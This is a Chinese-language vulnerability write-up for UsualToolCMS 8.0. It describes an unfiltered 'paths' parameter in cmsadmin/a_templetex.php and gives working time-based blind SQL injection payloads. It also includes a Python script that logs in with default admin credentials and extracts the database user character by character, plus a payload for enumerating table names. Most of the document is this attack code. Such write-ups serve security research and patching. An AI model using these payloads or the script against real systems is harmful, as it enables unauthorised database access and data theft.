### 0x01 漏洞环境

版本信息：UsualToolCMS-8.0-Release
 版本下载：http://www.a5xiazai.com/php/140604.html
 官网下载：https://cms.usualtool.com/down/UsualToolCMS-8.0-Release.zip

### 0x02 漏洞分析

在./cmsadmin/a_templetex.php文件第137行，paths变量没有过滤，136行从get处获取paths，没有任何过滤:
![1](UsualToolCMS-8.0 sql注⼊漏洞/1.png)

当从get处获得的t等于open时就可以出发这个sql注入，在文件第129行:
![2](UsualToolCMS-8.0 sql注⼊漏洞/2.png)

构造payload：

```
Copya_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring(user(),1,1))>0,sleep(5),1)--+
```

![3](UsualToolCMS-8.0 sql注⼊漏洞/3.png)

由于是时间盲注，编写延迟注入脚本:

```
Copy# -*- coding:utf-8 -*-
import time
import requests
session = requests.session()
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0'}
img_url = 'http://192.168.8.108:8081/UsualToolCMS-8.0-Release/class/UsualToolCMS_Code.php?r=13720'
img_req = session.get(url=img_url,headers=headers).content
with open('pic.png','wb') as f:
    f.write(img_req)
code = input('请输入验证码：')
data = {
    'uuser':'admin',
    'upass':'admin',
    'ucode':code
}
payloads = list('root@localhostasfafsasf')
url = 'http://192.168.8.108:8081/UsualToolCMS-8.0-Release/cmsadmin/a_login.php?do=login'
response = session.post(url=url,headers=headers,data=data)
res_url_1 = "http://192.168.8.108:8081/UsualToolCMS-8.0-Release/cmsadmin/a_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring(user(),{},1))={},sleep(5),1)--+"
result = ''
for i in range(1,15):
    for payload in payloads:
        res_url_2 = res_url_1.format(str(i),ord(payload))
        start_time = time.time()
        response = session.get(url=res_url_2,headers=headers)
        if time.time() - start_time > 7:
            result = result + payload
            print(result)
            break
```



爆数据库表payload：![4](UsualToolCMS-8.0 sql注⼊漏洞/4.png)

```
Copya_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>0,sleep(5),1)--+
```

![5](UsualToolCMS-8.0 sql注⼊漏洞/5.png)

\----------------------------------------------------------------------------